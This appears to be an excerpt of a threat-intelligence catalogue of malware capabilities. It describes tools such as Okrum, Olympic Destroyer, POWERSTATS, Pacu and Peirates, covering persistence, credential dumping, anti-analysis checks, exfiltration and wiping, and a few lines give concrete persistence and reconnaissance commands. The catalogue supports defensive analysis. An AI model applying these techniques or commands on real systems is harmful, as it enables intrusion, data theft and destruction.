OSX_OCEANLOTUS.D can also use use HTTP POST and GET requests to send and receive C2 information.
ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.
ObliqueRAT has the ability to extract data from removable devices connected to the endpoint.
ObliqueRAT has the ability to recursively enumerate files on an infected endpoint.
ObliqueRAT can copy specific files, webcam captures, and screenshots to local directories.
ObliqueRAT has gained execution on targeted systems through luring users to click on links to malicious URLs.
ObliqueRAT can discover pluggable/removable drives to extract files from.
ObliqueRAT can check for blocklisted process names on a compromised host.
ObliqueRAT can gain persistence by a creating a shortcut in the infected user's Startup directory.
ObliqueRAT can capture a screenshot of the current screen.
ObliqueRAT can hide its payload in BMP images hosted on compromised websites.
ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools.
ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints.
ObliqueRAT can check for blocklisted usernames on infected endpoints.
ObliqueRAT can capture images from webcams on compromised hosts.
OceanSalt can delete files from the system.
OceanSalt can extract drive information from the endpoint and search files on the system.
OceanSalt can encode data with a NOT operation before sending the data to the control server.
OceanSalt can collect the name and ID for every process running on the system.
OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments.
OceanSalt can collect the computer name from the system.
OceanSalt can collect the victim’s IP address.
OceanSalt can create a reverse shell on the infected endpoint using cmd.exe. OceanSalt has been executed via malicious macros.
Octopus has compressed data before exfiltrating it using a tool called Abbrevia.
Octopus can exfiltrate files from the system using a documents collector tool.
Octopus has uploaded stolen files and data from a victim's machine over its C2 channel.
Octopus has exfiltrated data to file sharing sites.
Octopus can collect information on the Windows directory and searches for compressed RAR files on the host.
Octopus can download additional files and tools onto the victim’s machine.
Octopus has stored collected information in the Application Data directory on a compromised host.
Octopus has relied upon users clicking on a malicious attachment delivered through spearphishing.
Octopus has been disguised as legitimate programs, such as Java and Telegram Messenger.
Octopus achieved persistence by placing a malicious executable in the startup directory and has added the &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; key to the Registry.
Octopus can capture screenshots of the victims’ machine.
Octopus has been delivered via spearsphishing emails.
Octopus has encoded C2 communications in Base64.
Octopus can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.
Octopus can collect the host IP address from the victim’s machine.
Octopus can collect the username from the victim’s machine.
Octopus has used HTTP GET and POST requests for C2 communications.
Octopus has used wmic.exe for local discovery information.
Okrum has used a custom implementation of AES encryption to encrypt collected data.
Okrum was seen using a RAR archiver tool to compress/decompress data.
Okrum was seen using modified Quarks PwDump to perform credential dumping.
Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.
Data exfiltration is done by Okrum using the already opened channel with the C2 server.
Okrum can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.
Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers.
Okrum has used DriveLetterView to enumerate drive information.
Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.
Okrum has built-in commands for uploading, downloading, and executing files to the system.
Okrum was seen using a keylogger tool to capture keystrokes.
Okrum was seen using MimikatzLite to perform credential dumping.
Okrum can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.
Okrum mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.
Okrum establishes persistence by creating a .lnk shortcut to itself in the Startup folder.
Okrum's installer can attempt to achieve persistence by creating a scheduled task.
Okrum's loader can create a new service named NtmsSvc to execute the payload.
Okrum can establish persistence by creating a .lnk shortcut to itself in the Startup folder.
Okrum has used base64 to encode C2 communication.
Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file.
Okrum uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase.
Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.
Okrum can collect computer name, locale information, and information about the OS and architecture.
Okrum can collect network information, including the host IP address, DNS, and proxy information.
Okrum was seen using NetSess to discover NetBIOS sessions.
Okrum can collect the victim username.
Okrum can obtain the date and time of the compromised system.
Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.
Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.
Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments.
Okrum uses HTTP for communication with its C2.
Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.
To establish persistence, Okrum can install itself as a new service named NtmSsvc.
Olympic Destroyer will attempt to clear the System and Security event logs using &lt;code&gt;wevtutil&lt;/code&gt;.
Olympic Destroyer contains a module that tries to obtain stored credentials from web browsers.
Olympic Destroyer overwrites files locally and on remote shares.
Olympic Destroyer uses the native Windows utilities &lt;code&gt;vssadmin&lt;/code&gt;, &lt;code&gt;wbadmin&lt;/code&gt;, and &lt;code&gt;bcdedit&lt;/code&gt; to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.
Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network.
Olympic Destroyer attempts to copy itself to remote machines on the network.
Olympic Destroyer will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.
Olympic Destroyer uses Windows Management Instrumentation to enumerate all systems in the network.
Olympic Destroyer uses PsExec to interact with the &lt;code&gt;ADMIN$&lt;/code&gt; network share to execute commands on remote systems.
Olympic Destroyer utilizes PsExec to help propagate itself across a network.
Olympic Destroyer uses the API call &lt;code&gt;ChangeServiceConfigW&lt;/code&gt; to disable all services on the affected system.
Olympic Destroyer uses API calls to enumerate the infected system's ARP table.
Olympic Destroyer will shut down the compromised system after it is done modifying system configuration settings.
Olympic Destroyer uses WMI to help propagate itself across a network.
OnionDuke can use a custom decryption algorithm to decrypt strings.
OnionDuke has the capability to use a Denial of Service module.
OnionDuke steals credentials from its victims.
OnionDuke uses Twitter as a backup C2.
OnionDuke uses HTTP and HTTPS for C2.
OopsIE compresses collected files with a simple character replacement scheme before sending them to its C2 server.
OopsIE compresses collected files with GZipStream before sending them to its C2 server.
OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.
OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.
OopsIE can upload files from the victim's machine to its C2 server.
OopsIE has the capability to delete files and scripts from the victim's machine.
OopsIE can download files from its C2 server to the victim's machine.
OopsIE stages the output from command execution and collected files in specific folders before exfiltration.
OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.
OopsIE creates a scheduled task to run itself every three minutes.
OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.
OopsIE encodes data in hexadecimal format over the C2 channel.
OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query &lt;code&gt;SELECT * FROM MSAcpi_ThermalZoneTemperature&lt;/code&gt; to check the temperature to see if it’s running in a virtual environment.
OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.
OopsIE checks to see if the system is configured with "Daylight" time and checks for a specific region to be set for the timezone.
OopsIE creates and uses a VBScript as part of its persistent execution.
OopsIE uses HTTP for C2 communications.
OopsIE uses the command prompt to execute commands on the victim's machine.
OopsIE uses WMI to perform discovery techniques.
Orz has used Technet and Pastebin web pages for command and control.
Orz can gather victim drive information.
Orz can overwrite Registry settings to reduce its visibility on the victim.
Orz can download files onto the victim.
Orz can perform Registry operations.
Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll.
Orz can gather a process list from the victim.
Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.
Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.
Orz can gather the victim's Internet Explorer version.
Orz can gather the victim OS version and whether it is 64 or 32 bit.
Orz can gather victim proxy information.
Orz can execute shell commands. Orz can execute commands with JavaScript.
Out1 can copy files and Registry data from compromised hosts.
Out1 can parse e-mails on a target machine.
Out1 has the ability to encode data.
Out1 can use HTTP and HTTPS in communications with remote hosts.
Out1 can use native command line for execution.
OutSteel can automatically scan for and collect files with specific extensions.
OutSteel can automatically upload collected files to its C2 server.
OutSteel can collect information from a compromised host.
OutSteel can upload files from a compromised host over its C2 channel.
OutSteel can delete itself following the successful execution of a follow-on payload.
OutSteel can search for specific file extensions, including zipped files.
OutSteel can download files from its C2 server.
OutSteel has relied on a user to execute a malicious attachment delivered via spearphishing.
OutSteel has relied on a user to click a malicious link within a spearphishing email.
OutSteel can identify running processes on a compromised host.
OutSteel has been distributed as a malicious attachment within a spearphishing email.
OutSteel has been distributed through malicious links contained within spearphishing emails.
OutSteel has used HTTP for C2 communications.
OutSteel has used `cmd.exe` to scan a compromised host for specific file extensions.
OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.
OwaAuth has a command to list its directory and logical drives.
OwaAuth has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.
OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, &lt;code&gt;C:\log.txt&lt;/code&gt;.
OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in &lt;code&gt;%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\&lt;/code&gt;; the malicious file by the same name is saved in &lt;code&gt;%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\&lt;/code&gt;.
OwaAuth has a command to timestop a file or directory.
OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.
OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.
P.A.S. Webshell has the ability to create reverse shells with Perl scripts.
P.A.S. Webshell has the ability to list and extract data from SQL databases.
P.A.S. Webshell has the ability to copy files on a compromised host.
P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.
P.A.S. Webshell can delete scripts from a subdirectory of /tmp after they are run.
P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.
P.A.S. Webshell can upload and download files to and from compromised hosts.
P.A.S. Webshell has the ability to modify file permissions.
P.A.S. Webshell can display the /etc/passwd file on a compromised host.
P.A.S. Webshell can scan networks for open ports and listening services.
P.A.S. Webshell can use encryption and base64 encoding to hide strings and to enforce access control once deployed.
P.A.S. Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.
P.A.S. Webshell can list PHP server configuration details.
P.A.S. Webshell can issue commands via HTTP POST.
P.A.S. Webshell can gain remote access and execution on target web servers.
P2P ZeuS added junk data to outgoing UDP packets to peer implants.
P8RAT can download additional payloads to a target system.
P8RAT can send randomly-generated data as part of its C2 communication.
P8RAT can check for specific processes associated with virtual environments.
P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments.
P8RAT has the ability to "sleep" for a specified time to evade detection.
PACEMAKER can enter a loop to read `/proc/` entries every 2 seconds in order to read a target application's memory.
PACEMAKER can parse `/proc/"process_name"/cmdline` to look for the string `dswsd` within the command line.
PACEMAKER has written extracted data to `tmp/dsserver-check.statementcounters`.
PACEMAKER has the ability to extract credentials from OS memory.
PACEMAKER can use PTRACE to attach to a targeted process to read process memory.
PACEMAKER can use a simple bash script for execution.
PHOREAL is capable of manipulating the Registry.
PHOREAL communicates via ICMP for C2.
PHOREAL is capable of creating reverse shell.
PITSTOP has the ability to communicate over TLS.
PITSTOP can deobfuscate base64 encoded and AES encrypted commands.
PITSTOP can listen over the Unix domain socket located at `/data/runtime/cockpit/wd.fd`.
PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at `/data/runtime/cockpit/wd.fd` for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS.
PITSTOP has the ability to receive shell commands over a Unix domain socket.
An older variant of PLAINTEE performs UAC bypass.
PLAINTEE has downloaded and executed additional plugins.
PLAINTEE uses &lt;code&gt;reg add&lt;/code&gt; to add a Registry Run key for persistence.
PLAINTEE performs the &lt;code&gt;tasklist&lt;/code&gt; command to list running processes.
PLAINTEE gains persistence by adding the Registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;.
PLAINTEE encodes C2 beacons using XOR.
PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.
PLAINTEE uses the &lt;code&gt;ipconfig /all&lt;/code&gt; command to gather the victim’s IP address.
PLAINTEE uses cmd.exe to execute commands on the victim’s machine.
PLEAD has the ability to list open windows on the compromised host.
PLEAD has the ability to steal saved passwords from Microsoft Outlook.
PLEAD can harvest saved credentials from browsers such as Google Chrome, Microsoft Internet Explorer, and Mozilla Firefox.
PLEAD has the ability to delete files on the compromised host.
PLEAD has the ability to list drives and files on the compromised host.
PLEAD has the ability to upload and download files to and from an infected host.
PLEAD samples were found to be highly obfuscated with junk code.
PLEAD has been executed via malicious e-mail attachments.
PLEAD has been executed via malicious links in e-mails.
PLEAD can use `ShellExecute` to execute applications.
PLEAD has the ability to list processes on the compromised host.
PLEAD has the ability to proxy network communications.
PLEAD has used RC4 encryption to download modules.
PLEAD has used HTTP for communications with command and control (C2) servers.
PLEAD has the ability to execute shell commands on the compromised host.
POORAIM has used AOL Instant Messenger for C2.
POORAIM has been delivered through compromised sites acting as watering holes.
POORAIM can conduct file browsing.
POORAIM can enumerate processes.
POORAIM can perform screen capturing.
POORAIM can identify system information, including battery status.
POSHSPY encrypts C2 traffic with AES and RSA.
POSHSPY uploads data in 2048-byte chunks.
POSHSPY uses a DGA to derive command and control URLs from a word list.
POSHSPY downloads and executes additional PowerShell code and Windows binaries.
POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.
POSHSPY uses PowerShell to execute various commands, one to execute its payload.
POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.
POSHSPY uses a WMI event subscription to establish persistence.
POWERSOURCE uses DNS TXT records for C2.
POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.
If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in &lt;code&gt;%PROGRAMDATA%\Windows\&lt;/code&gt;.
POWERSOURCE is a PowerShell backdoor.
POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence.
POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.
POWERSTATS has encrypted C2 traffic with RSA.
POWERSTATS has used useless code blocks to counter analysis.
POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob.  POWERSTATS has used PowerShell code with custom string obfuscation
POWERSTATS can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.
POWERSTATS can upload files from compromised hosts.
POWERSTATS can deobfuscate the main backdoor code.
POWERSTATS can disable Microsoft Office Protected View by changing Registry keys.
POWERSTATS can use DDE to execute additional payloads on compromised hosts.
POWERSTATS has connected to C2 servers through proxies.
POWERSTATS can delete all files on the C:\, D:\, E:\ and, F:\ drives using PowerShell Remove-Item commands.
POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.
POWERSTATS can use JavaScript code for execution.
POWERSTATS can retrieve usernames from compromised hosts.
POWERSTATS has created a scheduled task named "MicrosoftEdge" to establish persistence.
POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.
POWERSTATS uses PowerShell for obfuscation and execution.
POWERSTATS has used &lt;code&gt;get_tasklist&lt;/code&gt; to discover processes on the compromised host.
POWERSTATS has established persistence through a scheduled task using the command &lt;code&gt;”C:\Windows\system32\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe”&lt;/code&gt;.
POWERSTATS can sleep for a given number of seconds.
POWERSTATS can retrieve screenshots from compromised hosts.
POWERSTATS has detected security tools.
POWERSTATS encoded C2 traffic with base64.
POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.
POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts.
POWERSTATS has the ability to identify the username on the compromised host.
POWERSTATS can use VBScript (VBE) code for execution.
POWERSTATS can use WMI queries to retrieve data from compromised hosts.
POWERTON is written in PowerShell.
POWERTON can install a Registry Run key for persistence.
POWERTON has the ability to dump password hashes.
POWERTON has used AES for encrypting C2 traffic.
POWERTON has used HTTP/HTTPS for C2 traffic.
POWERTON can use WMI for persistence.
POWRUNER can use DNS for C2 communications.
POWRUNER may collect user account information by running &lt;code&gt;net user /domain&lt;/code&gt; or a series of other commands on a victim.
POWRUNER may collect domain group information by running &lt;code&gt;net group /domain&lt;/code&gt; or a series of other commands on a victim.
POWRUNER may enumerate user directories on a victim.
POWRUNER can download or upload files from its C2 server.
POWRUNER may collect local group information by running &lt;code&gt;net localgroup administrators&lt;/code&gt; or a series of other commands on a victim.
POWRUNER is written in PowerShell.
POWRUNER may collect process information by running &lt;code&gt;tasklist&lt;/code&gt; on a victim.
POWRUNER may query the Registry by running &lt;code&gt;reg query&lt;/code&gt; on a victim.
POWRUNER persists through a scheduled task that executes it every minute.
POWRUNER can capture a screenshot from a victim.
POWRUNER may collect information on the victim's anti-virus software.
POWRUNER can use base64 encoded C2 communications.
POWRUNER may collect information about the system by running &lt;code&gt;hostname&lt;/code&gt; and &lt;code&gt;systeminfo&lt;/code&gt; on a victim.
POWRUNER may collect network configuration data by running &lt;code&gt;ipconfig /all&lt;/code&gt; on a victim.
POWRUNER may collect active network connections by running &lt;code&gt;netstat -an&lt;/code&gt; on a victim.
POWRUNER may collect information about the currently logged in user by running &lt;code&gt;whoami&lt;/code&gt; on a victim.
POWRUNER can use HTTP for C2 communications.
POWRUNER can execute commands from its C2 server.
POWRUNER may use WMI when collecting information about a victim.
PS1 can use an XOR key to decrypt a PowerShell loader and payload binary.
PS1 can inject its payload DLL Into memory.
PS1 is distributed as a set of encrypted files and scripts.
CostaBricks can download additional payloads onto a compromised host.
PS1 can utilize a PowerShell loader.
PULSECHECK can base-64 encode encrypted data sent through C2.
PULSECHECK can use Unix shell script for command execution.
PULSECHECK can check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variable `HTTP_X_CMD.`
PULSECHECK is a web shell that can enable command execution on compromised servers.
PUNCHBUGGY can establish using a AppCertDLLs Registry key.
PUNCHBUGGY has Gzipped information and saved it to a random temp file before exfil.
PUNCHBUGGY has used PowerShell to decode base64-encoded assembly.
PUNCHBUGGY can delete files written to disk.
PUNCHBUGGY can download additional files and payloads to compromised hosts.
PUNCHBUGGY can gather user names.
PUNCHBUGGY has saved information to a random temp file before exfil.
PUNCHBUGGY mimics filenames from %SYSTEM%\System32 to hide DLLs in %WINDIR% and/or %TEMP%.
PUNCHBUGGY has hashed most its code's functions and encrypted payloads with base64 and XOR.
PUNCHBUGGY has used PowerShell scripts.
PUNCHBUGGY has used python scripts.
PUNCHBUGGY has been observed using a Registry Run key.
PUNCHBUGGY can load a DLL using Rundll32.
PUNCHBUGGY can gather AVs registered in the system.
PUNCHBUGGY can load a DLL using the LoadLibrary API.
PUNCHBUGGY can gather system information such as computer names.
PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests.
PUNCHTRACK scrapes memory for properly formatted payment card data.
PUNCHTRACK aggregates collected data in a tmp file.
PUNCHTRACK is loaded and executed by a highly obfuscated launcher.
Pacu can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.
Pacu can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.
Pacu leverages the AWS CLI for its operations.
Pacu can enumerate IAM users, roles, and groups.
Pacu leverages valid cloud accounts to perform most of its operations.
Pacu can run commands on EC2 instances using AWS Systems Manager Run Command.
Pacu can enumerate IAM permissions.
Pacu can enumerate AWS infrastructure, such as EC2 instances.
Pacu can retrieve secrets from the AWS Secrets Manager via the enum_secrets module.
Pacu can enumerate AWS services, such as CloudTrail and CloudWatch.
Pacu can enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.
Pacu can create snapshots of EBS volumes and RDS instances.
Pacu can enumerate and download files stored in AWS storage services, such as S3 buckets.
Pacu can allowlist IP addresses in AWS GuardDuty.
Pacu can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.
Pacu can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.
Pacu can collect CloudTrail event histories and CloudWatch logs.
Pacu can enumerate AWS security services, including WAF rules and GuardDuty detectors.
Pacu can create malicious Lambda functions.
Once inside a Virtual Private Cloud, Pacu can attempt to identify DirectConnect, VPN, or VPC Peering.
Pacu can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.
Pandora can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.
Pandora can use DLL side-loading to execute malicious payloads.
Pandora can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.
Pandora can load additional drivers and files onto a victim machine.
Pandora can write an encrypted token to the Registry to enable processing of remote commands.
Pandora has the ability to compress stings with QuickLZ.
Pandora can monitor processes on a compromised host.
Pandora can start and inject code into a new `svchost` process.
Pandora has the ability to install itself as a Windows service.
Pandora has the ability to encrypt communications with D3DES.
Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.
Pandora can communicate over HTTP.
Pandora has the ability to gain system privileges through Windows services.
Pasam creates a backdoor through which remote attackers can retrieve files.
Pasam creates a backdoor through which remote attackers can delete files.
Pasam creates a backdoor through which remote attackers can retrieve lists of files.
Pasam creates a backdoor through which remote attackers can upload files.
Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.
Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.
Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.
Pass-The-Hash Toolkit can perform pass the hash.
Pay2Key has used RSA encrypted communications with C2.
Pay2Key can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.
Pay2Key can remove its log file from disk.
Pay2Key has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.
Pay2Key has sent its public key to the C2 server over TCP.
Pay2Key can stop the MS SQL service at the end of the encryption process to release files locked by the service.
Pay2Key has the ability to gather the hostname of the victim machine.
Pay2Key can identify the IP and MAC addresses of the compromised host.
PcShare has created the `HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32` Registry key for persistence.
PcShare can collect files and information from a compromised host.
PcShare has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.
PcShare has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm.
PcShare can upload files and information from a compromised host to its C2 servers.
PcShare has deleted its files and components from a compromised host.
PcShare has used an invalid certificate in attempt to appear legitimate.
PcShare has the ability to capture keystrokes.
PcShare has been named `wuauclt.exe` to appear as the legitimate Windows Update AutoUpdate Client.
PcShare can delete its persistence mechanisms from the registry.
PcShare has used a variety of Windows API functions.
PcShare can obtain a list of running processes on a compromised host.
The PcShare payload has been injected into the `logagent.exe` and `rdpclip.exe` processes.
PcShare can search the registry files of a compromised host.
PcShare has used `rundll32.exe` for execution.
PcShare can take screen shots of a compromised machine.
PcShare can obtain the proxy settings of a compromised machine using `InternetQueryOptionA` and its IP address by running `nslookup myip.opendns.comresolver1.opendns.com\r\n`.
PcShare can capture camera video as part of its collection process.
PcShare has used HTTP for C2 communication.
PcShare can execute `cmd` commands on a compromised host.
Pcexter has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading.
Pcexter can upload files from targeted systems.
Pcexter can upload stolen files to OneDrive storage accounts via HTTP `POST`.
Pcexter has the ability to search for files in specified directories.
Peirates can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.
Peirates can use stolen service account tokens to perform its operations.
Peirates can query the query AWS and GCP metadata APIs for secrets.
Peirates can list AWS S3 buckets.
Peirates can query the Kubernetes API for secrets.
Peirates can use `kubectl` or the Kubernetes API to run commands.
Peirates can enumerate Kubernetes pods in a given namespace.
Peirates can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.
Peirates can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.
Peirates can gain a reverse shell on a host node by mounting the Kubernetes hostPath.
Peirates can initiate a port scan against a given IP address.
Peirates gathers Kubernetes service account tokens using a variety of techniques.
Penquin can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.
Penquin can use Cron to create periodic and pre-scheduled background jobs.
Penquin has encrypted strings in the binary for obfuscation.
Penquin can execute the command code &lt;code&gt;do_upload&lt;/code&gt; to send files to C2.
Penquin can delete downloaded executables after running them.
Penquin can use the command code &lt;code&gt;do_vslist&lt;/code&gt; to send file names, size, and status to C2.
Penquin can remove strings from binaries.
Penquin can execute the command code &lt;code&gt;do_download&lt;/code&gt; to retrieve remote files from C2.
Penquin can add the executable flag to a downloaded file.
Penquin has mimicked the Cron binary to hide itself on compromised systems.
Penquin can sniff network traffic to look for packets matching specific conditions.
The Penquin C2 mechanism is based on TCP and UDP packets.
Penquin installs a `TCP` and `UDP` filter on the `eth0` interface.
Penquin can report the file system type and disk space of a compromised host to C2.
Penquin can report the IP of the compromised host to attacker controlled infrastructure.
Penquin will connect to C2 only after sniffing a "magic packet" value in TCP or UDP packets matching specific conditions.
Penquin can execute remote commands using bash scripts.
Peppy has the ability to automatically exfiltrate files and keylogs.
Peppy can identify specific files for exfiltration.
Peppy can download and execute remote files.
Peppy can log keystrokes on compromised hosts.
Peppy can take screenshots on targeted systems.
Peppy can use HTTP to communicate with C2.
Peppy has the ability to execute shell commands.
Pillowmint has used a malicious shim database to maintain persistence.
Pillowmint has encrypted stolen credit card information with AES and further encoded it with Base64.
Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe.
Pillowmint can uninstall the malicious service from an infected machine.
Pillowmint has collected credit card data using native API functions.
Pillowmint has been decompressed by included shellcode prior to being launched.
Pillowmint has deleted the filepath &lt;code&gt;%APPDATA%\Intel\devmonsrv.exe&lt;/code&gt;.
Pillowmint has stored a compressed payload in the Registry key &lt;code&gt;HKLM\SOFTWARE\Microsoft\DRM&lt;/code&gt;.
Pillowmint has modified the Registry key &lt;code&gt;HKLM\SOFTWARE\Microsoft\DRM&lt;/code&gt; to store a malicious payload.
Pillowmint has used multiple native Windows APIs to execute and conduct process injections.
Pillowmint has been compressed and stored within a registry key. Pillowmint has also obfuscated the AES key used for encryption.
Pillowmint has used a PowerShell script to install a shim database.
Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later.
Pillowmint has used shellcode which reads code stored in the registry keys &lt;code&gt;\REGISTRY\SOFTWARE\Microsoft\DRM&lt;/code&gt; using the native Windows API as well as read &lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces&lt;/code&gt; as part of its C2.
PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.
PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer.
PinchDuke collects user files from the compromised host based on predefined file extensions.
PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.
PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).
PinchDuke gathers system configuration information.
PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server.
Ping can be used to identify remote systems within a network.
PingPull can collect data from a compromised host.
PingPull can decrypt received data from its C2 server by using AES.
PingPull has the ability to exfiltrate stolen victim data through its C2 channel.
PingPull can enumerate storage volumes and folder contents of a compromised host.
PingPull can mimic the names and descriptions of legitimate services such as `iphlpsvc`, `IP Helper`,  and `Onedrive` to evade detection.
PingPull variants have the ability to communicate with C2 servers using ICMP or TCP.
PingPull can use HTTPS over port 8080 for C2.
PingPull can encode C2 traffic with Base64.
PingPull can use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications.
PingPull can retrieve the hostname of a compromised host.
PingPull can retrieve the IP address of a compromised host.
PingPull has the ability to timestomp a file.
A PingPull variant can communicate with its C2 servers by using HTTPS.
PingPull can use `cmd.exe` to run various commands as a reverse shell.
PingPull has the ability to install itself as a service.
PipeMon installer can use UAC bypass techniques to install the payload.
PipeMon, its installer, and tools are signed with stolen code-signing certificates.
PipeMon can attempt to gain administrative privileges using token impersonation.
PipeMon can decrypt password-protected executables.
PipeMon can inject its modules into various processes using reflective DLL loading.
PipeMon modules are stored encrypted on disk.
PipeMon can switch to an alternate C2 domain when a particular date has been reached.
PipeMon has stored its encrypted payload in the Registry under `HKLM\SOFTWARE\Microsoft\Print\Components\`.
PipeMon can install additional modules via C2 commands.
